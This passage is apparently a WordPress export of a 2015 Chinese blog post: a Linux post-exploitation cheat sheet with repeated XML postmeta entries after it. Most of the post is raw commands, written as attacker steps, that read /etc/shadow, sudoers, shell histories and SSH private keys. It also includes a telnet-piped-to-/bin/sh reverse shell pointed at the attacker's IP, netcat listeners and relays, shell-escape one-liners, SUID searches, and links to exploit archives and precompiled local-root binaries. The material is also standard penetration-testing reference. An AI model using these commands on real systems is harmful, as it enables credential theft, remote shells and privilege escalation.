ls -al /etc/cron</em>
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
主机上可能有哪些纯文本用户名和密码?
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla
通信与网络
NIC(s)，系统有哪些？它是连接到哪一个网络？
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
其他用户主机与系统的通信？
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
缓存？IP和/或MAC地址?
arp -e
route
/sbin/route -nee
数据包可能嗅探吗？可以看出什么？监听流量

<h1>tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]</h1>

tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
你如何get一个shell？你如何与系统进行交互？

<h1>http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</h1>

nc -lvp 4444 # Attacker. 输入 (命令)
nc -lvp 4445 # Attacker. 输出(结果)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # 在目标系统上. 使用 攻击者的IP!
如何端口转发？（端口重定向）

<h1>rinetd</h1>

<h1>http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</h1>

<h1>fpipe</h1>

<h1>FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]</h1>

FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
#ssh

<h1>ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]</h1>

ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
#mknod

<h1>mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe</h1>

mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe # Port Relay
mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)
mknod
backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)
建立隧道可能吗？本地，远程发送命令
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
秘密信息和用户
你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？
id
who
w
last
cat /etc/passwd | cut -d: # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd # List of super users
cat /etc/sudoers
sudo -l
可以找到什么敏感文件？
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
什么有趣的文件在home/directorie（S）里？如果有权限访问
ls -ahlR /root/
ls -ahlR /home/
是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
用户做过什么？是否有任何密码呢？他们有没有编辑什么？
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
可以找到什么样的用户信息
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
private-key 信息能否被发现？
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
文件系统
哪些用户可以写配置文件在/ etc /？能够重新配置服务？
ls -aRl /etc/ | awk ‘$1 ~ /^.<em>w.</em>/' 2&gt;/dev/null # Anyone
ls -aRl /etc/ | awk ’$1 ~ /^..w/' 2&gt;/dev/null # Owner
ls -aRl /etc/ | awk ‘$1 ~ /^.....w/' 2&gt;/dev/null # Group
ls -aRl /etc/ | awk ’;$1 ~ /w.$/' 2&gt;/dev/null # Other
find /etc/ -readable -type f 2&gt;/dev/null # Anyone
find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone
在/ var /有什么可以发现？
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
网站上的任何隐藏配置/文件?配置文件与数据库信息？
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
有什么在日志文件里?（什么能够帮助到“本地文件包含”?)

<h1>http://www.thegeekstuff.com/2011/08/linux-var-log-files/</h1>

cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
#
auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,
mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)
如果命令限制，你可以打出哪些突破它的限制？
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
如何安装文件系统？
mount
df -h
是否有挂载的文件系统？
cat /etc/fstab
什么是高级Linux文件权限使用？Sticky bits, SUID 和GUID
find / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID
for i in <code>locate -r "bin$"</code>; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2&gt;/dev/null; done #
Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin,
/usr/local/bin, /usr/local/sbin and any other <em>bin, for SGID or SUID
(Quicker search)
#
findstarting at root (/), SGIDorSUID, not Symbolic links, only 3
folders deep, list with more detail and hideany errors (e.g. permission
denied)
find/-perm -g=s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld {} ;2&gt;/dev/null
在哪些目录可以写入和执行呢？几个“共同”的目录：/ tmp目录，/var / tmp目录/ dev /shm目录
find / -writable -type d 2&gt;/dev/null # world-writeable folders
find / -perm -222 -type d 2&gt;/dev/null # world-writeable folders
find / -perm -o+w -type d 2&gt;/dev/null # world-writeable folders
find / -perm -o+x -type d 2&gt;/dev/null # world-executable folders
find / ( -perm -o+w -perm -o+x ) -type d 2&gt;/dev/null # world-writeable &amp; executable folders
Any "problem" files？可写的的，“没有使用"的文件
find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print # world-writeable files
find /dir -xdev ( -nouser -o -nogroup ) -print # Noowner files
准备和查找漏洞利用代码
安装了什么开发工具/语言/支持？
find / -name perl</em>
find / -name python*
find / -name gcc*
find / -name cc
如何上传文件？
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
查找exploit代码
http://www.exploit-db.com
http://1337day.com
http://www.securiteam.com
http://www.securityfocus.com
http://www.exploitsearch.net
http://metasploit.com/modules/
http://securityreason.com
http://seclists.org/fulldisclosure/
http://www.google.com
查找更多有关漏洞的信息
http://www.cvedetails.com
http://packetstormsecurity.org/files/cve/[CVE]
http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]]http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
http://www.vulnview.com/cve-details.php?cvename=[CVE]]http://www.vulnview.com/cve-details.php?cvename=[CVE]
http://www.91ri.org/
(快速）“共同的“exploit,预编译二进制代码文件
http://tarantula.by.ru/localroot/
http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/
上面的信息很难吗？
快去使用第三方脚本/工具来试试吧！
系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？
apt-get update &amp;&amp; apt-get upgrade
yum update
服务运行所需的最低的权限？
例如，你需要以root身份运行MySQL？
能够从以下网站找到自动运行的脚本？！
http://pentestmonkey.net/tools/unix-privesc-check/
http://labs.portcullis.co.uk/application/enum4linux/
http://bastille-linux.sourceforge.net
（快速）指南和链接
例如
http://www.0daysecurity.com/penetration-testing/enumeration.html
http://www.microloft.co.uk/hacking/hacking3.htm
其他
http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf
http://pentest.cryptocity.net/files/clientsides/post_exploitation_fall09.pdf
http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>245</wp:post_id>
		<wp:post_date><![CDATA[2015-10-18 15:26:07]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-18 07:26:07]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%8f%b2%e4%b8%8a%e6%9c%80%e5%85%a8linux%e6%8f%90%e6%9d%83%e5%90%8e%e8%8e%b7%e5%8f%96%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%96%b9%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="post_tag" nicename="%e6%8f%90%e6%9d%83"><![CDATA[提权]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_c2efe04e61b6f9e1fbfc9243822faf7a]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f1d9317a18a74a2d65d8226f9df4df84]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_1d0fece61e4e763f24763128d1e1945c]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a2fc127ba6e8100fbd4479b1a01d52f2]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_483e58e0b0c4a6588ee0468b55f79df9]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a911cf7db290e330b4a069db66106626]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_bc60e426cfef7ebaab2e97a36d689b27]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_37f45983f6fd8bb86fa9020d63d2bb28]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_9d4c50b58d791f45db21a8600d64ce5d]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_d390e0b7169533643043018ee8ff12fb]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_d4f4eab48d2723623ee706bff55003ac]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_765605184e8a7995a9b50c8b93ebeb7a]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_98be6d5f8d1018717da9efc66d28dce2]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_721c6029f35687493bec155a06272004]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_42efc51f52655d8afd048e964ad1cc64]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_5f6a0aec4ab3812f1116803754dfd968]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_4ae7e46a2f96c727cae5b63cc5b87fe2]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b2e8f185b40ff33f5438b309af287891]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_77b90fec8490e41bfe81d406d4ce11bc]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_70843da687bae0815ca23b2b19de1bfb]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_0927611a76672a5a005b6fe385c730ed]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_8f77beabc43962c5ac07c0929bbec02b]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_6d9e98343848787afe24d203d969fdf5]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_fb4d26fa40c9d2d097b064d24d8a025e]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_e9c5c8ae0a73c49e2616e0bc1b0c4ba7]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f75fe0647deab34f9fa53b085993c0a2]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_adffbf3813d8c42eceb2100f1cbbb004]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_09782943ffef32c9f12032438eb0efca]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_4539e8b8b0c8b856b8c11d72b88f6e32]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_07595a23cf7ea7506999884c624c2de1]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_7a88bbdc77a0ef1b93f0013445effede]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_6b49d089a2262842e6582203397a9b2a]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_2b0c09217e8b1303019ab9e0d59c6396]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_30bb5a46e62634a3a55d4e16cd5462fc]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_17e1df80552030d8313c7118a5e6e9d8]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_e377008c09b522a39baa1f9092f721d3]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_8047c32787ef088fd9eaab07f4d35fc0]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_73306864240ab5e0a9774beeb85b55f2]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_62110f1dcf776eddd67baa17f910a8f6]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_2db13b8a6abfcd7ad6d79deb11572b28]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_922979b0d51b0ccb0e37097c8388301e]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_03bc7df00be13c3305486d2ea00366ec]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f977be5e319f42a6edc3e934a7836e12]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_858d13524e6319ad4093596fcab9d039]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_7dc3a32a9310fb17514085c895d8c031]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b9d9962e51b09fe34ef3469d4c6f54b6]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_ad3ae62ca9dee5f5e0d3c79de201d6e0]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f3a335bd20fa63cd268897bec2f40b95]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[186]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_befa680406971d12cd6e62cb359dcffc]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_40c07920c49f5f50be6586e98b6263d2]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_169d831de1c78fb0dc02b1f9fb908b20]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b5c90f529639177fa09ccecb9ed047b1]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b4d26595857e6b8d9bf9d30ec5300c4e]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_3d97f1d86e6065958a3388b510a14821]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_126780df1a00ad1a2f51165ec6faaa71]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_22fe816489823c6db0cbf1cf8fa94bfa]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_12785e97b885a5b112b8452ad3642c89]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_c7dd0dc0370b92d19ebd517cc8422233]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_ea79a3cd9e3a21a434d03f8cf8669748]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_e45a7505579dc8fd2e62b2eff4f321d8]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f99efb1c1f3bace0ca3066428dc13dc9]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a3e92de58e126034c882ca7bd89306b5]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_e9d472a4377f9aaa6fdabacb28b72f39]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_9e69a8c78eba87bc9e3a9dbda9a8d7c0]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_fc2158cb6f2454939c6962b22d1ac09c]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_cdece2236ab37c280be00ed78b404292]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_31af72209ee1fb7be294f6f027b7abd0]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_070d8c5a02a38d2a763dfa59977aa21a]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_e654753d9c974ea68364e14649f5967c]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a6090bc1167c901c0f7f382b6eeb44a5]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_7b53fe527b27be95a57ee210c5fac9a1]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_45870bf6c20124c753f0f36fac9a4ddf]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_2e04358c8237ab7b46207e0e8c69954e]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_13a073fc0277302691a3b34a48d000f3]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_8d491a377f24ab410cb0c2f63abb1f61]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f3fca85541fd5c740baf26ab36f26225]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a9240728e83fc9f0710993a02b2e410d]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_0a8e2419280fd4e524572d60ab338d4b]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
